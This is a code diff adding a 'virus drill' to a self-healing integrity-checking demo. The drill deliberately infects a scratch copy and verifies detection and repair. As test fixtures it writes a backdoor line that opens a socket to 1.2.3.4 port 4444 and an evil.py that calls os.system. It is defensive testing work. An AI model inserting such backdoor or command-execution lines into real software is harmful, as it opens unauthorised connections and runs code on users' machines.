@@ -120,6 +120,9 @@ def main():
     # H7 bonus: malicious logic injection -> integrity guard restores baseline
     demo_integrity()
 
+    # H7 virus drill: modify / add / delete all detected & healed
+    demo_virus()
+
     return 0 if ok else 1
 
 
@@ -190,6 +193,89 @@ def demo_integrity():
     print("\n" + "=" * 72)
     ok = res["status"] == "HEALED" and r.returncode == 0 and backdoor_gone
     print(f"H7 INTEGRITY DRILL : {'PASS' if ok else 'FAIL'}")
+    print("=" * 72)
+    return 0 if ok else 1
+
+
+def demo_virus():
+    """H7 virus drill: infect a copy three ways (modify / add / delete),
+    then verify the kit detects all three and repairs all three.
+
+      A) tamper   — append a backdoor to engine.py        -> byte restore
+      B) add      — drop a new evil.py                    -> quarantine
+      C) delete   — remove healers/brace_escape.py        -> recreate
+    """
+    print("\n" + "=" * 72)
+    print("H7 VIRUS DRILL — modify / add / delete are all detected & healed")
+    print("=" * 72)
+
+    work = os.path.join(HERE, "work", "virus_drill")
+    if os.path.exists(work):
+        shutil.rmtree(work)
+    dst = os.path.join(work, "self_heal_kit")
+    _copy_kit(dst)
+
+    # Baseline with embedded bytes (no git needed for restore).
+    sys.path.insert(0, HERE)
+    from healers.integrity_guard import make_baseline, IntegrityGuardHealer
+    make_baseline(dst, with_bytes=True)
+    print(f"\n[1] STAGE a copy with embedded-bytes baseline at:\n    {dst}")
+
+    # A) tamper existing file
+    engine = os.path.join(dst, "engine.py")
+    with open(engine, "a", encoding="utf-8") as fh:
+        fh.write("\n\n# [virus] backdoor\n"
+                 "import socket as _s\n"
+                 "_s.socket().connect(('1.2.3.4', 4444))\n")
+    # B) add malicious new file
+    evil = os.path.join(dst, "evil.py")
+    with open(evil, "w", encoding="utf-8") as fh:
+        fh.write("# [virus] malicious helper\nimport os\nos.system('calc.exe')\n")
+    # C) delete existing file
+    victim = os.path.join(dst, "healers", "brace_escape.py")
+    os.remove(victim)
+    print("[2] INFECTED:")
+    print("    A) engine.py += backdoor")
+    print("    B) evil.py dropped (new file)")
+    print("    C) healers/brace_escape.py deleted")
+
+    # Strict-mode detection catches all three.
+    h = IntegrityGuardHealer(detect_new_files=True)
+    faults = h.detect(dst)
+    print(f"\n[3] BEFORE (strict mode): {len(faults)} faults")
+    for f in faults:
+        kind = ("ADD" if "unexpected" in f.description
+                else "DELETE" if "missing" in f.description
+                else "TAMPER")
+        print(f"    [{kind}] {os.path.relpath(f.path, dst)}")
+
+    # Repair all.
+    print("\n[4] REPAIR:")
+    for f in faults:
+        res = h.repair(f)
+        print(f"    {os.path.relpath(f.path, dst)}: changed={res.changed}")
+
+    # Re-check + verify.
+    left = h.detect(dst)
+    print(f"\n[5] AFTER: remaining faults = {len(left)}")
+
+    r = _run([sys.executable, "-m", "pytest", "-q", "tests/"], cwd=dst)
+    print(f"    pytest exit = {r.returncode}")
+    tail = (r.stdout + r.stderr).strip().splitlines()
+    if tail:
+        print("    ", tail[-1])
+
+    backdoor_gone = "# [virus] backdoor" not in open(engine, encoding="utf-8").read()
+    evil_gone = not os.path.exists(evil)
+    victim_back = os.path.exists(victim)
+    print(f"    backdoor removed = {backdoor_gone}")
+    print(f"    evil.py quarantined = {evil_gone}")
+    print(f"    brace_escape.py recreated = {victim_back}")
+
+    print("\n" + "=" * 72)
+    ok = (len(left) == 0 and r.returncode == 0
+          and backdoor_gone and evil_gone and victim_back)
+    print(f"H7 VIRUS DRILL : {'PASS' if ok else 'FAIL'}")
     print("=" * 72)
     return 0 if ok else 1
 
